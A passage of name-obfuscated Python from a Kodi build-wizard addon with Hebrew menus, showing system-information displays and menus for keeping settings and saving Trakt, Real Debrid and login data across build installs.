	for OOOOO0O0OO0000OOO in sorted (OO0OO000OO000OO0O ,key =lambda O000000O0000OOO0O :O000000O0000OOO0O ):#line:2775
		OO0O0000OO0OOOO0O =os .path .split (OOOOO0O0OO0000OOO [:-1 ])[1 ]#line:2776
		if OO0O0000OO0OOOO0O =='packages':continue #line:2777
		O0O0O00OOO00OOO0O =os .path .join (OOOOO0O0OO0000OOO ,'addon.xml')#line:2778
		if os .path .exists (O0O0O00OOO00OOO0O ):#line:2779
			O00OO000O0O00O0O0 =open (O0O0O00OOO00OOO0O )#line:2780
			O0000OOO00OO0OOO0 =O00OO000O0O00O0O0 .read ()#line:2781
			OO0OOOOOOO000O00O =re .compile ("<provides>(.+?)</provides>").findall (O0000OOO00OO0OOO0 )#line:2782
			if len (OO0OOOOOOO000O00O )==0 :#line:2783
				if OO0O0000OO0OOOO0O .startswith ('skin'):O00OO0O0O0OO0OOO0 .append (OO0O0000OO0OOOO0O )#line:2784
				if OO0O0000OO0OOOO0O .startswith ('repo'):OOOOOOOOO0O00O00O .append (OO0O0000OO0OOOO0O )#line:2785
				else :OO00OOO0OOO0OOOO0 .append (OO0O0000OO0OOOO0O )#line:2786
			elif not (OO0OOOOOOO000O00O [0 ]).find ('executable')==-1 :OOO000000OO0000OO .append (OO0O0000OO0OOOO0O )#line:2787
			elif not (OO0OOOOOOO000O00O [0 ]).find ('video')==-1 :O0000O0O0O0000O0O .append (OO0O0000OO0OOOO0O )#line:2788
			elif not (OO0OOOOOOO000O00O [0 ]).find ('audio')==-1 :O0O00O00OO0O000O0 .append (OO0O0000OO0OOOO0O )#line:2789
			elif not (OO0OOOOOOO000O00O [0 ]).find ('image')==-1 :OOO000000OOO0OO0O .append (OO0O0000OO0OOOO0O )#line:2790
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2792
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O00000OO0O0 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2793
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O00000OO0O0 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2794
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:2795
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O00000OO0O0 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2796
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O00000OO0O0 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2797
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2799
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O00000OO0O0 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2800
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O00000OO0O0 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2801
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2803
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00OOO0OOOO000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2804
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO000O00OOO000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2805
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0000OO00OO0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2806
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2808
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0OO0O00O0OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2809
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0O0OO0OOO0OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2810
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O0O00O00000OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2811
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2813
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O00000OO0O0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2814
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO0O0O0O0000OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2815
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOOOOOOOOOO000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2816
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOO0OOOO0O0O0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2817
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O000O00000OO0O0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2818
	OOO0OO00OOOOOOOO0 =len (OOO000000OOO0OO0O )+len (O0O00O00OO0O000O0 )+len (O0000O0O0O0000O0O )+len (OOO000000OO0000OO )+len (OO00OOO0OOO0OOOO0 )+len (O00OO0O0O0OO0OOO0 )+len (OOOOOOOOO0O00O00O )#line:2820
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,OOO0OO00OOOOOOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2821
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0000O0O0O0000O0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2822
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO000000OO0000OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2823
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O00O00OO0O000O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2824
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO000000OOO0OO0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2825
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOOOOOOO0O00O00O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2826
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00OO0O0O0OO0OOO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2827
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO00OOO0OOO0OOOO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2828
def Menu ():#line:2829
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2830
def saveMenu ():#line:2832
	OOO00OOO0OOO0OO0O ='[COLOR green]מופעל[/COLOR]';O0OOOOO0OO0O00000 ='[COLOR red]מבוטל[/COLOR]'#line:2834
	OOOO0OOOO0OO0OO0O ='true'if KEEPMOVIEWALL =='true'else 'false'#line:2835
	O000OO0O0OO0O0O00 ='true'if KEEPMOVIELIST =='true'else 'false'#line:2836
	O00000O0000OOOOOO ='true'if KEEPINFO =='true'else 'false'#line:2837
	O0O00O00O00OOO0O0 ='true'if KEEPSOUND =='true'else 'false'#line:2839
	O0OOOO0O000O00OOO ='true'if KEEPVIEW =='true'else 'false'#line:2840
	O000000O0O0O0OOO0 ='true'if KEEPSKIN =='true'else 'false'#line:2841
	OOO0O00000O0O0000 ='true'if KEEPSKIN2 =='true'else 'false'#line:2842
	OOO0OO0OOOO00O00O ='true'if KEEPSKIN3 =='true'else 'false'#line:2843
	OO0O00O0OOO0000O0 ='true'if KEEPADDONS =='true'else 'false'#line:2844
	OO000O0OOOO000O00 ='true'if KEEPPVR =='true'else 'false'#line:2845
	O00OOOOOO0OOO0OO0 ='true'if KEEPTVLIST =='true'else 'false'#line:2846
	OO00OO000OOO00OOO ='true'if KEEPHUBMOVIE =='true'else 'false'#line:2847
	O0O000O0OOOO0O00O ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:2848
	O0O0OOO00O0OO0O00 ='true'if KEEPHUBTV =='true'else 'false'#line:2849
	O0OO0O00OO0OO0O0O ='true'if KEEPHUBVOD =='true'else 'false'#line:2850
	O0O000000O0O0O0OO ='true'if KEEPHUBKIDS =='true'else 'false'#line:2851
	O0O0O0O00OOO0O0OO ='true'if KEEPHUBMUSIC =='true'else 'false'#line:2852
	O00O00OO00000O0O0 ='true'if KEEPHUBMENU =='true'else 'false'#line:2853
	O00000OOOOOO00OOO ='true'if KEEPPLAYLIST =='true'else 'false'#line:2854
	O00O0OOO00O0OO0O0 ='true'if KEEPTRAKT =='true'else 'false'#line:2855
	O0OO0O00O0000O0OO ='true'if KEEPREAL =='true'else 'false'#line:2856
	OO0OOO000O0OOOO0O ='true'if KEEPRD2 =='true'else 'false'#line:2857
	O00OOOO0O00O0OOOO ='true'if KEEPTORNET =='true'else 'true'#line:2858
	OO0OO0OO0O0OOOOOO ='true'if KEEPLOGIN =='true'else 'false'#line:2859
	O00O000000OO00O00 ='true'if KEEPSOURCES =='true'else 'false'#line:2860
	OOO00OO00O0OOOOO0 ='true'if KEEPADVANCED =='true'else 'false'#line:2861
	OOOOO0000O0OOO0O0 ='true'if KEEPPROFILES =='true'else 'false'#line:2862
	OOO0O00O00O0OOO0O ='true'if KEEPFAVS =='true'else 'false'#line:2863
	OOO0O0OO00O00000O ='true'if KEEPREPOS =='true'else 'false'#line:2864
	O0O00OOOO00OO00O0 ='true'if KEEPSUPER =='true'else 'false'#line:2865
	O0O000OOOOOOO0000 ='true'if KEEPWHITELIST =='true'else 'false'#line:2866
	addFile ('אפשרויות שמירה קודי אנונימוס','',themeit =THEME3 )#line:2870
	if O0O000OOOOOOO0000 =='true':#line:2871
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:2872
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:2873
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:2874
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:2875
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:2876
	addFile ('%s התקנת קיר סרטים: '%OOOO0OOOO0OO0OO0O .replace ('true',OOO00OOO0OOO0OO0O ).replace ('false',O0OOOOO0OO0O00000 ),'togglesetting','keepmoviewall',icon =ICONTRAKT ,themeit =THEME1 )#line:2878
	addFile ('%s שמירת חשבון RD: '%O0OO0O00O0000O0OO .replace ('true',OOO00OOO0OOO0OO0O ).replace ('false',O0OOOOO0OO0O00000 ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:2879
	addFile ('%s שמירת חשבון טראקט: '%O00O0OOO00O0OO0O0 .replace ('true',OOO00OOO0OOO0OO0O ).replace ('false',O0OOOOO0OO0O00000 ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:2880
	addFile ('%s שמירת מועדפים: '%OOO0O00O00O0OOO0O .replace ('true',OOO00OOO0OOO0OO0O ).replace ('false',O0OOOOO0OO0O00000 ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:2883
	addFile ('%s שמירת לקוח טלוויזיה: '%OO000O0OOOO000O00 .replace ('true',OOO00OOO0OOO0OO0O ).replace ('false',O0OOOOO0OO0O00000 ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:2884
	addFile ('%s שמירת רשימת עורצי טלוויזיה: '%O00OOOOOO0OOO0OO0 .replace ('true',OOO00OOO0OOO0OO0O ).replace ('false',O0OOOOO0OO0O00000 ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:2885
	addFile ('%s שמירת אריח סרטים: '%OO00OO000OOO00OOO .replace ('true',OOO00OOO0OOO0OO0O ).replace ('false',O0OOOOO0OO0O00000 ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:2886
	addFile ('%s שמירת אריח סדרות: '%O0O000O0OOOO0O00O .replace ('true',OOO00OOO0OOO0OO0O ).replace ('false',O0OOOOO0OO0O00000 ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:2887
	addFile ('%s שמירת אריח טלויזיה: '%O0O0OOO00O0OO0O00 .replace ('true',OOO00OOO0OOO0OO0O ).replace ('false',O0OOOOO0OO0O00000 ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:2888
	addFile ('%s שמירת אריח תוכן ישראלי: '%O0OO0O00OO0OO0O0O .replace ('true',OOO00OOO0OOO0OO0O ).replace ('false',O0OOOOO0OO0O00000 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:2889
	addFile ('%s שמירת אריח ילדים: '%O0O000000O0O0O0OO .replace ('true',OOO00OOO0OOO0OO0O ).replace ('false',O0OOOOO0OO0O00000 ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:2890
	addFile ('%s שמירת אריח מוסיקה: '%O0O0O0O00OOO0O0OO .replace ('true',OOO00OOO0OOO0OO0O ).replace ('false',O0OOOOO0OO0O00000 ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:2891
	addFile ('%s שמירת תפריט אריחים ראשי: '%O00O00OO00000O0O0 .replace ('true',OOO00OOO0OOO0OO0O ).replace ('false',O0OOOOO0OO0O00000 ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:2892
	addFile ('%s שמירת כל האריחים בסקין: '%O000000O0O0O0OOO0 .replace ('true',OOO00OOO0OOO0OO0O ).replace ('false',O0OOOOO0OO0O00000 ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:2893
	addFile ('%s שמירת הרחבות שהתקנתי: '%OO0O00O0OOO0000O0 .replace ('true',OOO00OOO0OOO0OO0O ).replace ('false',O0OOOOO0OO0O00000 ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:2900
	addFile ('%s שמירת סיסמאות, חשבונות ,מיקומי הורדות: '%O00000O0000OOOOOO .replace ('true',OOO00OOO0OOO0OO0O ).replace ('false',O0OOOOO0OO0O00000 ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:2901
	addFile ('%s שמירת ספריית סרטים וסדרות: '%O000OO0O0OO0O0O00 .replace ('true',OOO00OOO0OOO0OO0O ).replace ('false',O0OOOOO0OO0O00000 ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:2904
	addFile ('%s שמירת מקורות וידאו: '%O00O000000OO00O00 .replace ('true',OOO00OOO0OOO0OO0O ).replace ('false',O0OOOOO0OO0O00000 ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:2905
	addFile ('%s שמירת הגדרות סאונד ורזולוציה: '%O0O00O00O00OOO0O0 .replace ('true',OOO00OOO0OOO0OO0O ).replace ('false',O0OOOOO0OO0O00000 ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:2906
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה : '%O0OOOO0O000O00OOO .replace ('true',OOO00OOO0OOO0OO0O ).replace ('false',O0OOOOO0OO0O00000 ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:2908
	addFile ('%s שמירת פליליסט לאודר: '%O00000OOOOOO00OOO .replace ('true',OOO00OOO0OOO0OO0O ).replace ('false',O0OOOOO0OO0O00000 ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:2909
	addFile ('%s שמירת הרחבות ידנית: '%O0O000OOOOOOO0000 .replace ('true',OOO00OOO0OOO0OO0O ).replace ('false',O0OOOOO0OO0O00000 ),'togglesetting','keepwhitelist',icon =ICONSAVE ,themeit =THEME1 )#line:2910
	addFile ('%s שמירת הגדרות באפר: '%OOO00OO00O0OOOOO0 .replace ('true',OOO00OOO0OOO0OO0O ).replace ('false',O0OOOOO0OO0O00000 ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:2914
	addFile ('%s שמירת סופר מועדפים: '%O0O00OOOO00OO00O0 .replace ('true',OOO00OOO0OOO0OO0O ).replace ('false',O0OOOOO0OO0O00000 ),'togglesetting','keepsuper',icon =ICONSAVE ,themeit =THEME1 )#line:2915
	addFile ('%s שמירת רשימות ריפו: '%OOO0O0OO00O00000O .replace ('true',OOO00OOO0OOO0OO0O ).replace ('false',O0OOOOO0OO0O00000 ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:2916
	setView ('files','viewType')#line:2918
def traktMenu ():#line:2920
	OOO000OOO0O00OO00 ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:2921
	OOOO00OO00OOO000O =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:2922
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:2923
	addFile ('Save Trakt Data: %s'%OOO000OOO0O00OO00 ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:2924
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (OOOO00OO00OOO000O ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2925
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2926
	for OOO000OOO0O00OO00 in traktit .ORDER :#line:2928
		O000O0OOO0OOO0OO0 =TRAKTID [OOO000OOO0O00OO00 ]['name']#line:2929
		OO0000000OOO00O00 =TRAKTID [OOO000OOO0O00OO00 ]['path']#line:2930
		O00OOO000O00OO0O0 =TRAKTID [OOO000OOO0O00OO00 ]['saved']#line:2931
		O0OOOOOOOO00OOOO0 =TRAKTID [OOO000OOO0O00OO00 ]['file']#line:2932
		O0O00OOOOO00000OO =wiz .getS (O00OOO000O00OO0O0 )#line:2933
		O00O0OO00OOO00OOO =traktit .traktUser (OOO000OOO0O00OO00 )#line:2934
		OOOO00000O0000OOO =TRAKTID [OOO000OOO0O00OO00 ]['icon']if os .path .exists (OO0000000OOO00O00 )else ICONTRAKT #line:2935
		O00OOOO0OOOO00O0O =TRAKTID [OOO000OOO0O00OO00 ]['fanart']if os .path .exists (OO0000000OOO00O00 )else FANART #line:2936
		O0O00000O000O000O =createMenu ('saveaddon','Trakt',OOO000OOO0O00OO00 )#line:2937
		O0O00O00OOOO0OOOO =createMenu ('save','Trakt',OOO000OOO0O00OO00 )#line:2938
		O0O00000O000O000O .append ((THEME2 %'%s Settings'%O000O0OOO0OOO0OO0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,OOO000OOO0O00OO00 )))#line:2939
		addFile ('[+]-> %s'%O000O0OOO0OOO0OO0 ,'',icon =OOOO00000O0000OOO ,fanart =O00OOOO0OOOO00O0O ,themeit =THEME3 )#line:2941
		if not os .path .exists (OO0000000OOO00O00 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOO00000O0000OOO ,fanart =O00OOOO0OOOO00O0O ,menu =O0O00000O000O000O )#line:2942
		elif not O00O0OO00OOO00OOO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',OOO000OOO0O00OO00 ,icon =OOOO00000O0000OOO ,fanart =O00OOOO0OOOO00O0O ,menu =O0O00000O000O000O )#line:2943
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O00O0OO00OOO00OOO ,'authtrakt',OOO000OOO0O00OO00 ,icon =OOOO00000O0000OOO ,fanart =O00OOOO0OOOO00O0O ,menu =O0O00000O000O000O )#line:2944
		if O0O00OOOOO00000OO =="":#line:2945
			if os .path .exists (O0OOOOOOOO00OOOO0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',OOO000OOO0O00OO00 ,icon =OOOO00000O0000OOO ,fanart =O00OOOO0OOOO00O0O ,menu =O0O00O00OOOO0OOOO )#line:2946
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',OOO000OOO0O00OO00 ,icon =OOOO00000O0000OOO ,fanart =O00OOOO0OOOO00O0O ,menu =O0O00O00OOOO0OOOO )#line:2947
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O00OOOOO00000OO ,'',icon =OOOO00000O0000OOO ,fanart =O00OOOO0OOOO00O0O ,menu =O0O00O00OOOO0OOOO )#line:2948
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2950
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2951
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2952
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2953
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2954
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2955
	setView ('files','viewType')#line:2956
def realMenu ():#line:2958
	O0O0OOO00O0000O00 ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:2959
	O0OOO00O0OO00O0O0 =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:2960
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:2961
	addFile ('Save Real Debrid Data: %s'%O0O0OOO00O0000O00 ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:2962
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O0OOO00O0OO00O0O0 ),'',icon =ICONREAL ,themeit =THEME3 )#line:2963
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:2964
	for OOO00OO0OOO00000O in debridit .ORDER :#line:2966
		O00OOO00000000000 =DEBRIDID [OOO00OO0OOO00000O ]['name']#line:2967
		OOOOO0OOOO0000OO0 =DEBRIDID [OOO00OO0OOO00000O ]['path']#line:2968
		OOOOO0O0000OO0O00 =DEBRIDID [OOO00OO0OOO00000O ]['saved']#line:2969
		OO00O00OOOOO00OOO =DEBRIDID [OOO00OO0OOO00000O ]['file']#line:2970
		O0O00OO00OOOO0OO0 =wiz .getS (OOOOO0O0000OO0O00 )#line:2971
		O0OOO00000OOO0OO0 =debridit .debridUser (OOO00OO0OOO00000O )#line:2972
		O00O00O000000OO0O =DEBRIDID [OOO00OO0OOO00000O ]['icon']if os .path .exists (OOOOO0OOOO0000OO0 )else ICONREAL #line:2973
		OOOO00OO0OOO0O0OO =DEBRIDID [OOO00OO0OOO00000O ]['fanart']if os .path .exists (OOOOO0OOOO0000OO0 )else FANART #line:2974
		O000O0OOOOO0O0OOO =createMenu ('saveaddon','Debrid',OOO00OO0OOO00000O )#line:2975
		OO0OO0O0O0OO00O0O =createMenu ('save','Debrid',OOO00OO0OOO00000O )#line:2976
		O000O0OOOOO0O0OOO .append ((THEME2 %'%s Settings'%O00OOO00000000000 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,OOO00OO0OOO00000O )))#line:2977
		addFile ('[+]-> %s'%O00OOO00000000000 ,'',icon =O00O00O000000OO0O ,fanart =OOOO00OO0OOO0O0OO ,themeit =THEME3 )#line:2979
		if not os .path .exists (OOOOO0OOOO0000OO0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O00O00O000000OO0O ,fanart =OOOO00OO0OOO0O0OO ,menu =O000O0OOOOO0O0OOO )#line:2980
		elif not O0OOO00000OOO0OO0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',OOO00OO0OOO00000O ,icon =O00O00O000000OO0O ,fanart =OOOO00OO0OOO0O0OO ,menu =O000O0OOOOO0O0OOO )#line:2981
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0OOO00000OOO0OO0 ,'authdebrid',OOO00OO0OOO00000O ,icon =O00O00O000000OO0O ,fanart =OOOO00OO0OOO0O0OO ,menu =O000O0OOOOO0O0OOO )#line:2982
		if O0O00OO00OOOO0OO0 =="":#line:2983
			if os .path .exists (OO00O00OOOOO00OOO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',OOO00OO0OOO00000O ,icon =O00O00O000000OO0O ,fanart =OOOO00OO0OOO0O0OO ,menu =OO0OO0O0O0OO00O0O )#line:2984
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',OOO00OO0OOO00000O ,icon =O00O00O000000OO0O ,fanart =OOOO00OO0OOO0O0OO ,menu =OO0OO0O0O0OO00O0O )#line:2985
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O00OO00OOOO0OO0 ,'',icon =O00O00O000000OO0O ,fanart =OOOO00OO0OOO0O0OO ,menu =OO0OO0O0O0OO00O0O )#line:2986
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2988
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2989
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2990
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2991
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2992
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:2993
	setView ('files','viewType')#line:2994
def loginMenu ():#line:2996
	O0000O0000OOOO0OO ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:2997
	O0OOO0OO0O0O0000O =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:2998
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:2999
	addFile ('Save Login Data: %s'%O0000O0000OOOO0OO ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3000
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (O0OOO0OO0O0O0000O ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3001
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3002
	for O0000O0000OOOO0OO in loginit .ORDER :#line:3004
		O00000O0O0O000O00 =LOGINID [O0000O0000OOOO0OO ]['name']#line:3005
		O0000O0O000000O00 =LOGINID [O0000O0000OOOO0OO ]['path']#line:3006
		OOO0O0OOOOO0OOOOO =LOGINID [O0000O0000OOOO0OO ]['saved']#line:3007
		OOOOO0OOO00OOOOOO =LOGINID [O0000O0000OOOO0OO ]['file']#line:3008
		O0OOOOO0O0O0O0O00 =wiz .getS (OOO0O0OOOOO0OOOOO )#line:3009
		O0OO0OOOO000OO000 =loginit .loginUser (O0000O0000OOOO0OO )#line:3010
		OOO00O00000O0OOO0 =LOGINID [O0000O0000OOOO0OO ]['icon']if os .path .exists (O0000O0O000000O00 )else ICONLOGIN #line:3011
		O00OO00OO0OOOO0O0 =LOGINID [O0000O0000OOOO0OO ]['fanart']if os .path .exists (O0000O0O000000O00 )else FANART #line:3012
		OOOO0O0O0OO00OOO0 =createMenu ('saveaddon','Login',O0000O0000OOOO0OO )#line:3013
		OOOO0O00OOOOO0OOO =createMenu ('save','Login',O0000O0000OOOO0OO )#line:3014
